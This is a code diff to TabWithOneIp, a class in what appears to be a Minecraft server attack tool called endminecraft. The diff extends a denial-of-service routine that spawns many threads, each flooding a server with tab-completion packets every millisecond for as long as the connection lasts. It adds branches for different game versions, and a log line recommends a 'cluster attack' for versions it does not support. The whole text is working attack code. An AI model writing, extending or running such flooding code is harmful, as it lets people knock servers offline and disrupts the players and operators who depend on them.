@@ -1,5 +1,6 @@
 package me.alikomi.endminecraft.tasks.attack;
 
+import me.alikomi.endminecraft.Main;
 import me.alikomi.endminecraft.utils.Util;
 import org.spacehq.mc.protocol.MinecraftProtocol;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
@@ -36,12 +37,25 @@ public class TabWithOneIp extends Util {
 
                     for (int i = 0; i < thread; i++) {
                         new Thread(() -> {
-                            while (mc.getSession().isConnected()) {
-                                mc.getSession().send(new ClientTabCompletePacket("/"));
-                                try {
-                                    Thread.sleep(1);
-                                } catch (InterruptedException e) {
-                                    e.printStackTrace();
+                            if (Main.minecraftVersion.contains("1.9") || Main.minecraftVersion.contains("1.10")) {
+                                while (mc.getSession().isConnected()) {
+                                    mc.getSession().send(new ClientTabCompletePacket("/",false));
+                                    try {
+                                        Thread.sleep(1);
+                                    } catch (InterruptedException e) {
+                                        e.printStackTrace();
+                                    }
+                                }
+                            }else if (Main.minecraftVersion.contains("1.11") || Main.minecraftVersion.contains("1.12")) {
+                                log("暂时不支持1.11和1.12的单ip TAB攻击，请使用集群攻击");
+                            }else {
+                                while (mc.getSession().isConnected()) {
+                                    TabWithOneIp_17_8.qwq(mc);
+                                    try {
+                                        Thread.sleep(1);
+                                    } catch (InterruptedException e) {
+                                        e.printStackTrace();
+                                    }
                                 }
                             }
                         }).start();
